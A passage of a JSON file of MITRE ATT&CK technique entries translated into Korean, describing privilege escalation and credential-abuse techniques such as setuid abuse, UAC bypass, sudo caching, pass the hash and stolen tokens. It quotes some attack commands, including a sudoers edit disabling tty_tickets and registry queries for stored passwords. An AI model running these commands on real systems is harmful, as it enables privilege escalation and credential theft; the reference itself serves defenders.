      "modified": "2021-10-18T16:36:37.042Z",
      "title": "Login Items",
      "translated": true
    },
    {
      "description": "위협 행위자는 높은 수준의 권한을 얻기 위해 권한 상승을 제어하기 위해 설계된 메커니즘을 우회할 수 있습니다. 대부분의 현대 시스템에는 사용자가 기계에서 수행할 수 있는 권한을 제한하기 위해 의도된 내장 권한 상승 제어 메커니즘이 포함되어 있습니다. 높은 위험으로 간주될 수 있는 작업을 수행하기 위해서는 특정 사용자에게 권한이 부여되어야 합니다. (출처: TechNet UAC 작동 방식) (출처: sudo 매뉴얼 페이지 2018) 위협 행위자는 시스템에서 권한을 상승시키기 위해 내장된 제어 메커니즘을 활용할 수 있는 여러 방법을 수행할 수 있습니다. (출처: OSX Keydnap 악성 코드) (출처: Fortinet Fareit)",
      "external_id": "T1548",
      "modified": "2024-10-15T15:32:21.811Z",
      "title": "Abuse Elevation Control Mechanism",
      "translated": true
    },
    {
      "description": "적대자는 애플리케이션에 setuid 또는 setgid 비트가 설정된 구성을 악용하여 다른(그리고 아마도 더 권한이 부여된) 사용자의 컨텍스트에서 코드를 실행할 수 있습니다. Linux 또는 macOS에서 애플리케이션 이진 파일에 setuid 또는 setgid 비트가 설정된 경우, 애플리케이션은 각각 소유 사용자 또는 그룹의 권한으로 실행됩니다.(인용: setuid 매뉴얼 페이지) 일반적으로 애플리케이션은 현재 사용자의 컨텍스트에서 실행되며, 이 경우 애플리케이션을 소유하는 사용자나 그룹에 상관없이 동작합니다. 그러나 프로그램이 제대로 기능하기 위해 상승된 컨텍스트에서 실행되어야 하는 경우가 있으며, 이를 실행하는 사용자가 특정 필수 권한을 가지고 있지 않을 수 있습니다.\n\n루트가 수행해야 하는 sudoers 파일에 항목을 추가하는 대신, 모든 사용자는 자신의 애플리케이션에 대해 setuid 또는 setgid 플래그를 설정할 수 있습니다(즉, [Linux 및 Mac 파일 및 디렉터리 권한 수정](https://attack.mitre.org/techniques/T1222/002)). <code>chmod</code> 명령어는 비트 마스킹으로 이러한 비트를 설정할 수 있으며, <code>chmod 4777 [파일]</code> 또는 단축 이름을 사용하여 <code>chmod u+s [파일]</code>로 설정할 수 있습니다. 이는 setuid 비트를 활성화합니다. setgid 비트를 활성화하려면 <code>chmod 2775</code> 및 <code>chmod g+s</code>를 사용할 수 있습니다.\n\n적대자는 자신의 맬웨어에서 이 메커니즘을 사용하여 미래에 상승된 컨텍스트에서 실행할 수 있도록 할 수 있습니다.(인용: OSX Keydnap 맬웨어) 이러한 악용은 종종 \"셸 탈출\" 또는 제한된 권한이 있는 실행 환경을 우회하기 위한 기타 조치의 일환으로 발생합니다.\n\n대안으로, 적대자는 이미 setuid 또는 setgid 비트가 활성화된 취약한 이진 파일을 찾고 표적화할 수 있습니다(즉, [파일 및 디렉터리 탐색](https://attack.mitre.org/techniques/T1083)). setuid 및 setgid 비트는 <code>ls -l</code>을 통해 파일 속성을 볼 때 \"x\" 대신 \"s\"로 표시됩니다. <code>find</code> 명령어를 사용하여 이러한 파일을 검색할 수도 있습니다. 예를 들어, <code>find / -perm +4000 2>/dev/null</code>는 setuid가 설정된 파일을 찾는 데 사용될 수 있으며, <code>find / -perm +2000 2>/dev/null</code>는 setgid를 찾는 데 사용할 수 있습니다. 이러한 비트가 설정된 이진 파일은 적대자에 의해 악용될 수 있습니다.(인용: GTFOBins Suid)",
      "external_id": "T1548.001",
      "modified": "2023-03-15T18:43:20.995Z",
      "title": "Setuid and Setgid",
      "translated": true
    },
    {
      "description": "공격자는 시스템에서 프로세스 권한을 상승시키기 위해 UAC 메커니즘을 우회할 수 있습니다. Windows 사용자 계정 컨트롤(UAC)은 프로그램이 관리자 수준의 권한으로 작업을 수행할 수 있도록 권한을 상승시키는 기능을 제공하며, 이는 사용자에게 확인을 요청하는 방식으로 이루어질 수 있습니다. UAC의 영향은 높은 강제력이 적용될 경우 작업이 거부되거나, 사용자가 로컬 관리자 그룹에 포함되어 프롬프트를 통해 클릭하거나 관리자 비밀번호를 입력하여 작업을 완료할 수 있는 경우로 나뉩니다. (출처: TechNet How UAC Works)\n\n컴퓨터의 UAC 보호 수준이 가장 높은 수준이 아닌 경우, 특정 Windows 프로그램은 UAC 알림 상자를 통해 사용자에게 확인을 요청하지 않고도 권한을 상승시키거나 일부 상승된 [COM(구성 요소 개체 모델)](https://attack.mitre.org/techniques/T1559/001) 객체를 실행할 수 있습니다. (출처: TechNet Inside UAC)(출처: MSDN COM Elevation) 예를 들어, [Rundll32](https://attack.mitre.org/techniques/T1218/011)를 사용하여 특별히 제작된 DLL을 로드하고, 자동으로 상승된 [COM](https://attack.mitre.org/techniques/T1559/001) 객체를 로드하여 일반적으로 상승된 접근이 요구되는 보호된 디렉토리에서 파일 작업을 수행할 수 있습니다. 악성 소프트웨어는 신뢰할 수 있는 프로세스에 주입되어 사용자에게 알림을 요청하지 않고 상승된 권한을 얻을 수도 있습니다. (출처: Davidson Windows)\n\nUAC를 우회하는 방법은 여러 가지가 발견되었습니다. UACME의 Github README 페이지에는 발견되고 구현된 방법의 광범위한 목록이 포함되어 있으나 (출처: Github UACMe) 이는 포괄적인 우회 방법 목록이 아닐 수 있습니다. 추가적인 우회 방법은 정기적으로 발견되며 실제로도 사용됩니다. 예를 들면:\n\n* <code>eventvwr.exe</code>는 자동으로 권한을 상승시키고 지정된 바이너리나 스크립트를 실행할 수 있습니다. (출처: enigma0x3 Fileless UAC Bypass)(출처: Fortinet Fareit)\n\n또 다른 우회 방법은 관리자 권한이 있는 계정의 자격 증명이 알려져 있을 경우 몇 가지 측면 이동 기술을 통해 가능하며, UAC는 단일 시스템 보안 메커니즘이므로, 한 시스템에서 실행 중인 프로세스의 권한이나 무결성을 원격 시스템에서는 알 수 없으며 기본적으로 높은 무결성으로 간주됩니다. (출처: SANS UAC Bypass)",
      "external_id": "T1548.002",
      "modified": "2023-04-21T12:35:39.112Z",
      "title": "Bypass User Account Control",
      "translated": true
    },
    {
      "description": "적대자는 특권 상승을 위해 sudo 캐싱을 수행하거나 sudoers 파일을 사용할 수 있습니다. 이를 통해 다른 사용자로서 명령을 실행하거나 더 높은 특권으로 프로세스를 생성할 수 있습니다.\n\nLinux 및 MacOS 시스템 내에서, sudo(때때로 \"superuser do\"라고도 언급됨)는 사용자가 터미널에서 elevated privileges로 명령을 수행하고 시스템에서 이러한 명령을 수행할 수 있는 사용자를 제어할 수 있게 해줍니다. <code>sudo</code> 명령은 \"시스템 관리자가 특정 사용자(또는 사용자 그룹)에게 root 또는 다른 사용자로서 일부(또는 모든) 명령을 실행할 수 있는 권한을 위임할 수 있도록 하며, 명령과 그 인수에 대한 감사 추적을 제공합니다.\"(인용: sudo 매뉴얼 2018) sudo는 시스템 관리자를 위해 만들어졌기 때문에 <code>timestamp_timeout</code>과 같은 유용한 구성 기능을 가지고 있으며, 이는 비밀번호를 다시 묻는 sudo 인스턴스 간의 분(minute) 단위의 시간입니다. 이는 <code>sudo</code>가 일정 시간 동안 자격 증명을 캐시할 수 있기 때문입니다. Sudo는 마지막으로 sudo가 실행된 때의 타임스탬프가 있는 파일을 <code>/var/db/sudo</code>에 생성(또는 업데이트)하여 이 시간을 결정합니다. 추가적으로, 각 새로운 tty(터미널 세션)를 독립적으로 처리하는 <code>tty_tickets</code> 변수가 있습니다. 이는 예를 들어, 하나의 tty의 sudo 타임아웃이 다른 tty에 영향을 미치지 않음을 의미합니다(비밀번호를 다시 입력해야 함).\n\nsudoers 파일인 <code>/etc/sudoers</code>는 어떤 사용자가 어떤 명령을 어느 터미널에서 실행할 수 있는지를 설명합니다. 또한 사용자가 다른 사용자 또는 그룹으로서 어떤 명령을 실행할 수 있는지도 설명합니다. 이는 사용자가 대부분의 시간 동안 가능한 낮은 권한으로 실행하고, 필요할 때만 비밀번호를 입력하여 다른 사용자 또는 권한으로 상승할 수 있도록 하는 최소 권한 원칙을 제공합니다. 하지만 sudoers 파일은 <code>user1 ALL=(ALL) NOPASSWD: ALL</code>와 같은 줄로 비밀번호를 입력하지 않도록 사용자를 지정할 수도 있습니다.(인용: OSX.Dok 악성코드) 이 파일을 편집하기 위해서는 높은 권한이 필요합니다.\n\n적대자는 사용자의 비밀번호 없이도 특권을 상승할 수 있도록 이 메커니즘의 잘못된 구성을 악용할 수 있습니다. 예를 들어, <code>/var/db/sudo</code>의 타임스탬프를 모니터링하여 <code>timestamp_timeout</code> 범위 내에 있는지 확인할 수 있습니다. 만약 그렇다면, 악성코드는 사용자의 비밀번호를 입력하지 않고도 sudo 명령을 실행할 수 있습니다. 추가로, <code>tty_tickets</code>가 비활성화된 경우, 적대자는 해당 사용자의 모든 tty에서 이 작업을 수행할 수 있습니다.\n\n실제 사례에서, 악성코드는 <code>tty_tickets</code>를 비활성화하여 <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>를 발행함으로써 스크립팅을 쉽게 만들려고 했습니다.(인용: cybereason osx proton) 이 변경사항이 반영되기 위해 악성코드는 <code>killall Terminal</code> 명령을 실행하기도 했습니다. macOS Sierra 버전 이후로 sudoers 파일은 기본적으로 <code>tty_tickets</code>가 활성화되어 있습니다.",
      "external_id": "T1548.003",
      "modified": "2022-03-14T16:28:19.781Z",
      "title": "Sudo and Sudo Caching",
      "translated": true
    },
    {
      "description": "공격자는 <code>AuthorizationExecuteWithPrivileges</code> API를 활용하여 사용자에게 자격 증명을 요청함으로써 권한 상승을 시도할 수 있습니다.(출처: AppleDocs AuthorizationExecuteWithPrivileges) 이 API의 목적은 애플리케이션 개발자에게 애플리케이션 설치 또는 업데이트와 같은 루트 권한으로 작업을 수행할 수 있는 간편한 방법을 제공하는 것입니다. 이 API는 루트 권한을 요청하는 프로그램이 신뢰할 수 있는 출처에서 온 것인지 또는 악의적으로 수정되었는지를 검증하지 않습니다.\n\n비록 이 API는 더 이상 권장되지 않지만, 최신 macOS 버전에서도 완전히 작동합니다. 이 API를 호출할 때 사용자는 자격 증명을 입력하라는 메시지를 받지만 프로그램의 출처나 무결성에 대한 검사는 이루어지지 않습니다. API를 호출하는 프로그램은 또한 전 세계적으로 쓰기 가능한 파일을 로드할 수 있으며, 이를 수정하여 상승된 권한으로 악의적인 동작을 수행할 수 있습니다.\n\n공격자는 <code>AuthorizationExecuteWithPrivileges</code>를 남용하여 루트 권한을 얻고 피해자에게 악성 소프트웨어를 설치하며 지속성을 위한 메커니즘을 설정할 수 있습니다.(출처: 1000개의 설치 프로그램에 의한 죽음; 모든 것이 망가졌다!)(출처: Carbon Black Shlayer 2019년 2월)(출처: OSX Coldroot RAT) 이 기술은 [탈각](https://attack.mitre.org/techniques/T1036) 기술과 결합되어 사용자가 악성 코드에 대한 상승된 권한을 부여하도록 속일 수 있습니다.(출처: 1000개의 설치 프로그램에 의한 죽음; 모든 것이 망가졌다!)(출처: Carbon Black Shlayer 2019년 2월) 이 기술은 또한 이 API를 사용하는 기계에 존재하는 정품 프로그램을 수정하여 작동하는 것으로 나타났습니다.(출처: 1000개의 설치 프로그램에 의한 죽음; 모든 것이 망가졌다!)",
      "external_id": "T1548.004",
      "modified": "2022-10-19T16:35:18.492Z",
      "title": "Elevated Execution with Prompt",
      "translated": true
    },
    {
      "description": "공격자는 권한 구성의 오남용을 통해 클라우드 리소스에 임시로 상승된 접근 권한을 얻을 수 있습니다. 많은 클라우드 환경에서는 관리자가 사용자 또는 서비스 계정에 역할에 대한 적시 접근 권한을 요청하거나 다른 계정을 가장하거나, 리소스 및 서비스에 역할을 전달하는 등의 권한을 부여할 수 있습니다. 이로 인해 사용자 계정은 제한된 기간 동안 자신과는 다른 권한 집합에 대한 단기 접근을 가질 수 있습니다.\n\n적시 접근은 클라우드 계정에 추가 역할을 세분화된 임시 방식으로 부여하는 메커니즘입니다. 이를 통해 계정은 일상적으로 필요한 권한만 사용하고 필요할 때 추가적인 권한을 요청할 수 있습니다. 때때로 적시 접근 요청은 수동 승인을 요구하도록 구성되지만, 다른 경우에는 원하는 권한이 자동으로 부여됩니다.(출처: Azure Just in Time Access 2023)\n\n계정 가장은 사용자 또는 서비스 계정이 다른 계정의 권한으로 임시로 행동할 수 있도록 합니다. 예를 들어, GCP에서는 `iam.serviceAccountTokenCreator` 역할을 가진 사용자가 서비스 계정의 권한으로 임시 접근 토큰을 생성하거나 임의의 페이로드에 서명할 수 있으며, 도메인 전체 위임 권한을 가진 서비스 계정은 Google Workspace 계정을 가장할 수 있습니다.(출처: Google Cloud Service Account Authentication Roles)(출처: Hunters Domain Wide Delegation Google Workspace 2023)(출처: Google Cloud Just in Time Access 2023)(출처: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) Exchange Online에서는 `ApplicationImpersonation` 역할이 서비스 계정이 지정된 사용자 계정과 관련된 권한을 사용할 수 있도록 합니다.(출처: Microsoft Impersonation and EWS in Exchange)\n\n많은 클라우드 환경에는 사용자가 리소스에 역할을 전달하여 작업을 수행하고 다른 서비스에 인증할 수 있는 메커니즘도 포함되어 있습니다. 리소스를 생성한 사용자는 이를 통해 직접적으로 역할을 맡지 않지만, 여전히 부여된 권한을 통해 역할의 접근을 활용할 수 있습니다. 예를 들어, AWS에서는 `PassRole` 권한이 있는 사용자가 자신이 만든 서비스가 특정 역할을 맡도록 허용할 수 있으며, GCP에서는 `iam.serviceAccountUser` 역할이 있는 사용자가 리소스에 서비스 계정을 연결할 수 있습니다.(출처: AWS PassRole)(출처: Google Cloud Service Account Authentication Roles)\n\n사용자가 이러한 기능을 사용하기 위해서는 특정 역할 할당이 필요하지만, 클라우드 관리자는 권한을 잘못 구성할 수 있습니다. 이로 인해 공격자가 원래 의도한 것 그 이상으로 리소스에 접근할 수 있는 상승 경로가 생길 수 있습니다.(출처: Rhino Google Cloud Privilege Escalation)(출처: Rhino Security Labs AWS Privilege Escalation)\n\n**참고:** 이 기법은 [추가 클라우드 역할](https://attack.mitre.org/techniques/T1098/003)과는 구별됩니다. 추가 클라우드 역할은 기존 권한 구조를 오남용하여 리소스에 임시로 상승된 접근을 얻는 것이 아니라 계정에 영구적인 역할을 할당하는 것입니다. 그러나 충분히 권한이 높은 계정을 손상시킨 공격자는 자신이 제어하는 다른 계정에 [추가 클라우드 역할](https://attack.mitre.org/techniques/T1098/003)을 부여하여 이러한 기능을 오남용할 수 있습니다. 이는 특히 로그가 역할 가장이 일어나는 시점을 명확히 하지 않을 때, 고위험 계정을 직접 사용하는 것보다 더 높은 은폐성을 허용할 수 있습니다.(출처: CrowdStrike StellarParticle January 2022)",
      "external_id": "T1548.005",
      "modified": "2024-10-15T16:07:49.519Z",
      "title": "Temporary Elevated Cloud Access",
      "translated": true
    },
    {
      "description": "적대 세력은 투명성, 동의 및 통제(TCC) 서비스 또는 데이터베이스를 조작하거나 악용하여 악성 실행 파일에 상승된 권한을 부여할 수 있습니다. TCC는 macOS의 개인 정보 및 보안 제어 메커니즘으로, 실행 중인 프로세스가 화면 공유, 카메라, 마이크 또는 전체 디스크 액세스(FDA)와 같이 TCC에 의해 보호되는 데이터 또는 서비스에 접근할 권한이 있는지를 결정하는 데 사용됩니다.\n\n응용 프로그램이 TCC에 의해 보호되는 데이터 또는 서비스에 접근하기를 요청하면, TCC 데몬(`tccd`)은 `/Library/Application Support/com.apple.TCC/TCC.db`(또는 `~/`에 해당하는 경로)에 위치한 TCC 데이터베이스와 연결된 파일(기기 관리(MDM)에 연결된 경우)에서 기존 권한을 확인합니다. 권한이 존재하지 않는 경우, 사용자에게 권한 부여를 요청하는 메시지가 표시됩니다. 권한이 부여되면, 데이터베이스는 응용 프로그램의 권한을 저장하며, 리셋되기 전까지 사용자에게 다시 요청하지 않습니다. 예를 들어, 웹 브라우저가 사용자의 웹캠에 대한 권한을 요청할 때, 한번 부여되면 웹 브라우저는 사용자에게 다시 명시적으로 요청하지 않을 수 있습니다.(출처: welivesecurity TCC)\n\n적대 세력은 [프로세스 인젝션](https://attack.mitre.org/techniques/T1055)을 통해 이전에 권한이 부여된 응용 프로그램을 악용하거나 다른 응용 프로그램을 사용하여 악성 이진 파일을 실행함으로써 TCC에 의해 보호되는 제한된 데이터 또는 서비스에 접근할 수 있습니다. 예를 들어, 적대 세력은 FDA 권한을 가진 macOS의 기본 응용 프로그램인 Finder를 사용하여 악성 [AppleScript](https://attack.mitre.org/techniques/T1059/002)를 실행할 수 있습니다. Finder 앱에서 실행될 때, 악성 [AppleScript](https://attack.mitre.org/techniques/T1059/002)는 사용자 요청 없이 시스템의 모든 파일에 대한 접근 권한을 상속받습니다. 시스템 무결성 보호(SIP)가 비활성화된 경우, TCC 보호도 비활성화됩니다. SIP가 활성화되지 않은 시스템에서는, 적대 세력이 환경 변수를 사용하여 적대자가 제어하는 TCC 데이터베이스를 로드함으로써 자신의 악성 실행 파일에 권한을 추가하는 방식으로 TCC 데이터베이스를 조작할 수 있습니다. (출처: TCC macOS 우회)(출처: TCC 데이터베이스)",
      "external_id": "T1548.006",
      "modified": "2024-10-16T16:54:56.714Z",
      "title": "TCC Manipulation",
      "translated": true
    },
    {
      "description": "적대 세력은 패스워드 해시, 카보로스 티켓, 애플리케이션 접근 토큰과 같은 대체 인증 자료를 사용하여 환경 내에서 수평 이동을 하거나 정상적인 시스템 접근 제어를 우회할 수 있습니다.\n\n인증 과정은 일반적으로 유효한 아이덴티티(예: 사용자 이름)와 하나 이상의 인증 요소(예: 비밀번호, PIN, 물리적 스마트 카드, 토큰 생성기 등)를 요구합니다. 대체 인증 자료는 사용자가 유효한 아이덴티티와 요구된 인증 요소를 제공하여 성공적으로 인증한 후 시스템에 의해 합법적으로 생성됩니다. 대체 인증 자료는 아이덴티티 생성 과정에서도 생성될 수 있습니다.(인용: NIST 인증)(인용: NIST MFA)\n\n대체 인증 자료를 캐싱하면 시스템이 사용자가 인증 요소를 다시 입력하도록 요청하지 않고도 아이덴티티가 성공적으로 인증되었음을 확인할 수 있습니다. 그러나 대체 인증 자료는 시스템에서 메모리 또는 디스크에 유지 관리되어야 하므로 [자격 증명 접근](https://attack.mitre.org/tactics/TA0006) 기법을 통해 도난당할 위험이 있습니다. 대체 인증 자료를 도난당하면 적대 세력은 시스템 접근 제어를 우회하고 평문 비밀번호나 추가 인증 요소를 알지 않고도 시스템에 인증할 수 있게 됩니다.",
      "external_id": "T1550",
      "modified": "2024-10-15T16:09:19.001Z",
      "title": "Use Alternate Authentication Material",
      "translated": true
    },
    {
      "description": "공격자는 도난된 애플리케이션 접근 토큰을 사용하여 일반적인 인증 절차를 우회하고 원격 시스템의 제한된 계정, 정보 또는 서비스에 접근할 수 있습니다. 이러한 토큰은 일반적으로 사용자 또는 서비스에서 도난당하며 로그인 자격 증명 대신 사용됩니다.\n\n애플리케이션 접근 토큰은 사용자 또는 서비스를 대신하여 권한이 부여된 API 요청을 만드는 데 사용되며, 클라우드, 컨테이너 기반 애플리케이션 및 서비스형 소프트웨어(SaaS)에서 자주 사용됩니다. (인용: Auth0 - Why You Should Always Use Access Tokens to Secure APIs 2019년 9월)\n\nOAuth는 시스템에 대한 접근을 위해 사용자에게 토큰을 발급하는 일반적으로 구현된 프레임워크 중 하나입니다. 이러한 프레임워크는 사용자를 검증하고 사용자가 수행할 수 있는 작업을 결정하기 위해 협력하여 사용됩니다. 신원이 확립되면, 토큰은 실제 사용자 자격 증명을 전달하지 않고도 작업을 승인할 수 있도록 합니다. 따라서 토큰이 손상되면 공격자는 악성 애플리케이션을 통해 다른 사이트의 리소스에 접근할 수 있습니다. (인용: okta)\n\n예를 들어, 클라우드 기반 이메일 서비스의 경우, OAuth 접근 토큰이 악성 애플리케이션에 부여되면, \"리프레시\" 토큰이 백그라운드 접근을 허용할 경우 사용자 계정의 기능에 장기적으로 접근할 수 있습니다. (인용: Microsoft Identity Platform Access 2019) OAuth 접근 토큰을 통해 공격자는 사용자에게 부여된 REST API를 사용하여 이메일 검색 및 연락처 나열과 같은 기능을 수행할 수 있습니다. (인용: Staaldraad Phishing with OAuth 2017)\n\n손상된 접근 토큰은 다른 서비스에 대한 권한을 탈취하는 초기 단계로 사용될 수 있습니다. 예를 들어, 특정 토큰이 피해자의 주 이메일에 접근할 수 있는 경우 공격자는 잊어버린 비밀번호 절차를 유발하여 타겟이 가입한 모든 서비스에 대한 접근 권한을 확장할 수 있습니다. AWS 및 GCP 환경에서 공격자는 다른 사용자 계정의 권한을 가진 단기 접근 토큰을 요청하도록 유도할 수 있습니다. (인용: Google Cloud Service Account Credentials)(인용: AWS Temporary Security Credentials) 이후 공격자는 이 토큰을 사용하여 데이터를 요청하거나 원래 계정이 할 수 없는 작업을 수행할 수 있습니다. 이 기능에 대한 권한이 잘못 구성된 경우 - 예를 들어 특정 계정에 대한 토큰 요청을 모든 사용자에게 허용하는 경우 - 공격자는 클라우드 계정에 초기 접근 권한을 얻거나 권한을 상승시킬 수 있습니다. (인용: Rhino Security Labs Enumerating AWS Roles)\n\n토큰을 통한 직접 API 접근은 두 번째 인증 요소의 효과를 무력화하며, 비밀번호 변경과 같은 직관적인 대응 조치에 면역이 될 수 있습니다. 예를 들어, AWS 환경에서 사용자의 AWS API 자격증명이 손상된 경우 공격자는 `sts:GetFederationToken` API 호출을 사용하여 연합 사용자 세션을 생성할 수 있으며, 이 세션은 원래 사용자와 동일한 권한을 갖지만 원래 사용자 자격 증명이 비활성화되더라도 지속될 수 있습니다. (인용: Crowdstrike AWS User Federation Persistence) 또한, API 채널을 통한 접근 남용은 서비스 제공자 측에서도 감지하기 어려울 수 있습니다. 접근이 여전히 정당한 워크플로우와 잘 정렬될 수 있기 때문입니다.",
      "external_id": "T1550.001",
      "modified": "2024-10-15T15:38:11.583Z",
      "title": "Application Access Token",
      "translated": true
    },
    {
      "description": "공격자는 도난당한 비밀번호 해시를 사용하여 환경 내에서 수평적으로 이동할 때 \"해시 전달(Pass the Hash, PtH)\"을 사용할 수 있으며, 이는 정상적인 시스템 접근 제어를 우회하는 방법입니다. 해시 전달(PtH)은 사용자의 명확한 비밀번호에 접근하지 않고 사용자로 인증하는 방법입니다. 이 방법은 명확한 비밀번호를 요구하는 표준 인증 단계를 우회하고, 비밀번호 해시를 사용하는 인증 부분으로 직접 이동합니다.\n\nPtH를 수행할 때, 사용 중인 계정에 대한 유효한 비밀번호 해시는 [자격 증명 접근(Credential Access)](https://attack.mitre.org/tactics/TA0006) 기법을 사용하여 캡처됩니다. 캡처된 해시는 PtH와 함께 사용되어 해당 사용자로 인증됩니다. 인증이 완료되면, PtH는 로컬 또는 원격 시스템에서 작업을 수행하는 데 사용될 수 있습니다.\n\n공격자는 또한 도난당한 비밀번호 해시를 사용하여 \"해시 우회(overpass the hash)\"를 수행할 수 있습니다. PtH와 유사하게, 이는 비밀번호 해시를 사용하여 사용자로 인증하는 것을 포함하지만, 비밀번호 해시를 사용하여 유효한 Kerberos 티켓을 생성하는 것도 포함됩니다. 이 티켓은 이후 [티켓 전달(Pass the Ticket)](https://attack.mitre.org/techniques/T1550/003) 공격을 수행하는 데 사용될 수 있습니다. (출처: Stealthbits Overpass-the-Hash)",
      "external_id": "T1550.002",
      "modified": "2023-07-28T18:24:16.246Z",
      "title": "Pass the Hash",
      "translated": true
    },
    {
      "description": "공격자는 도난당한 Kerberos 티켓을 사용하여 환경 내에서 측면 이동을 하며, 정상적인 시스템 접근 제어를 우회하는 \"티켓 전달(Pass the Ticket, PtT)\" 기법을 사용할 수 있습니다. 티켓 전달은 계정의 비밀번호에 접근하지 않고도 Kerberos 티켓을 사용하여 시스템에 인증하는 방법입니다. Kerberos 인증은 원격 시스템으로의 측면 이동의 첫 번째 단계로 사용될 수 있습니다.\n\nPtT를 수행할 때, [유효 계정(Valid Accounts)](https://attack.mitre.org/techniques/T1078)용 유효한 Kerberos 티켓이 [운영 체제 자격 증명 덤핑(OS Credential Dumping)](https://attack.mitre.org/techniques/T1003)을 통해 캡처됩니다. 사용자의 서비스 티켓 또는 티켓 부여 티켓(TGT)을 얻을 수 있으며, 이는 접근 수준에 따라 달라질 수 있습니다. 서비스 티켓은 특정 리소스에 대한 접근을 허용하는 반면, TGT는 티켓 부여 서비스(Ticket Granting Service, TGS)로부터 서비스 티켓을 요청하여 사용자가 접근할 수 있는 모든 리소스에 접근하는 데 사용할 수 있습니다. (인용: ADSecurity AD Kerberos Attacks)(인용: GentilKiwi Pass the Ticket)\n\n[실버 티켓(Silver Ticket)](https://attack.mitre.org/techniques/T1558/002)은 Kerberos를 인증 메커니즘으로 사용하는 서비스에 대해 얻을 수 있으며, 해당 리소스에 접근하기 위한 티켓을 생성하는 데 사용됩니다. 이 시스템은 해당 리소스를 호스팅합니다 (예: SharePoint). (인용: ADSecurity AD Kerberos Attacks)\n\n[골든 티켓(Golden Ticket)](https://attack.mitre.org/techniques/T1558/001)은 Key Distribution Service 계정인 KRBTGT 계정의 NTLM 해시를 사용하여 도메인에 대해 얻을 수 있으며, 이는 Active Directory의 모든 계정에 대해 TGT를 생성할 수 있게 합니다. (인용: Campbell 2014)\n\n공격자는 도난당한 비밀번호 해시 또는 AES 키와 같은 다른 사용자 정보를 사용하여 유효한 Kerberos 티켓을 생성할 수도 있습니다. 예를 들어, \"해시를 초과하는(overpassing the hash)\" 것은 NTLM 비밀번호 해시를 사용하여 사용자로 인증하는 동시에 이 비밀번호 해시를 사용하여 유효한 Kerberos 티켓을 생성하는 것을 포함합니다. (인용: Stealthbits Overpass-the-Hash)",
      "external_id": "T1550.003",
      "modified": "2024-09-12T15:21:09.330Z",
      "title": "Pass the Ticket",
      "translated": true
    },
    {
      "description": "공격자는 도난당한 세션 쿠키를 사용하여 웹 애플리케이션 및 서비스에 인증할 수 있습니다. 이 기술은 세션이 이미 인증되었기 때문에 일부 다단계 인증 프로토콜을 우회합니다.(인용: 쿠키 전달)\n\n인증 쿠키는 사용자가 서비스에 인증을 받은 후 클라우드 기반 서비스를 포함한 웹 애플리케이션에서 일반적으로 사용됩니다. 이를 통해 자격 증명이 전달되지 않고 재인증이 자주 필요하지 않습니다. 쿠키는 종종 장기간 유효하며, 웹 애플리케이션이 활성화되지 않은 경우에도 마찬가지입니다. HTML 쿠키가 [웹 세션 쿠키 도용](https://attack.mitre.org/techniques/T1539) 또는 [웹 쿠키](https://attack.mitre.org/techniques/T1606/001)를 통해 획득된 후, 공격자는 이 쿠키를 자신이 제어하는 브라우저에 임포트하고 세션 쿠키가 활성화되어 있는 한 사용자로서 사이트나 애플리케이션을 사용할 수 있습니다. 사이트에 로그인한 후 공격자는 민감한 정보에 접근하거나 이메일을 읽거나 피해자 계정이 수행할 수 있는 작업을 수행할 수 있습니다.\n\n다단계 인증 시스템을 우회하기 위해 세션 쿠키를 표적으로 하는 악성 코드의 예가 있습니다.(인용: Unit 42 Mac Crypto Cookies 2019년 1월)",
      "external_id": "T1550.004",
      "modified": "2024-10-15T16:11:15.657Z",
      "title": "Web Session Cookie",
      "translated": true
    },
    {
      "description": "적대자는 손상된 시스템을 검색하여 안전하지 않게 저장된 자격 증명을 찾고 확보할 수 있습니다. 이러한 자격 증명은 시스템의 여러 위치에 저장되거나 잘못 배치될 수 있으며, 여기에는 일반 텍스트 파일(예: [Bash 히스토리](https://attack.mitre.org/techniques/T1552/003)), 운영 체제 또는 응용 프로그램별 저장소(예: [레지스트리의 자격 증명](https://attack.mitre.org/techniques/T1552/002)), 또는 기타 특수 파일/아티팩트(예: [개인 키](https://attack.mitre.org/techniques/T1552/004))가 포함됩니다. (출처: MimiKatz를 유닉스에 적용하기)",
      "external_id": "T1552",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Unsecured Credentials",
      "translated": true
    },
    {
      "description": "공격자는 로컬 파일 시스템 및 원격 파일 공유에서 안전하지 않게 저장된 자격 증명이 포함된 파일을 검색할 수 있습니다. 이러한 파일은 사용자가 자신의 자격 증명을 저장하기 위해 생성한 파일, 개인 그룹을 위한 공유 자격 증명 저장소, 시스템이나 서비스의 비밀번호를 포함한 구성 파일, 또는 임베디드 비밀번호가 있는 소스 코드/바이너리 파일이 될 수 있습니다.\n\n[OS 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003)을 통해 백업 또는 저장된 가상 머신에서 비밀번호를 추출할 수 있습니다.(출처: CG 2014) 비밀번호는 또한 윈도우 도메인 컨트롤러에 저장된 그룹 정책 환경 설정에서 얻을 수 있습니다.(출처: SRD GPP)\n\n클라우드 및/또는 컨테이너화된 환경에서는 인증된 사용자 및 서비스 계정 자격 증명이 종종 로컬 구성 및 자격 증명 파일에 저장됩니다.(출처: Unit 42 Hildegard Malware) 이들은 또한 컨테이너 로그의 배포 명령에 대한 매개변수로 발견될 수 있습니다.(출처: Unit 42 Unsecured Docker Daemons) 경우에 따라 이러한 파일을 복사하여 다른 기계에서 재사용하거나 내용을 읽고 파일을 복사하지 않고도 인증하는 데 사용할 수 있습니다.(출처: Specter Ops - Cloud Credential Storage)",
      "external_id": "T1552.001",
      "modified": "2024-10-15T14:28:43.639Z",
      "title": "Credentials In Files",
      "translated": true
    },
    {
      "description": " 공격자는 손상된 시스템에서 안전하지 않게 저장된 자격 증명을 찾기 위해 레지스트리를 검색할 수 있습니다. Windows 레지스트리는 시스템이나 다른 프로그램이 사용할 수 있는 구성 정보를 저장합니다. 공격자는 다른 프로그램이나 서비스에서 사용하기 위해 저장된 자격 증명 및 비밀번호를 찾기 위해 레지스트리를 쿼리할 수 있습니다. 때때로 이러한 자격 증명은 자동 로그온에 사용됩니다.\n\n비밀번호 정보와 관련된 레지스트리 키를 찾기 위한 예제 명령어는 다음과 같습니다: (출처: Pentestlab Stored Credentials)\n\n* 로컬 머신 하이브: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* 현재 사용자 하이브: <code>reg query HKCU /f password /t REG_SZ /s</code>",
      "external_id": "T1552.002",
      "modified": "2024-10-15T16:26:46.873Z",
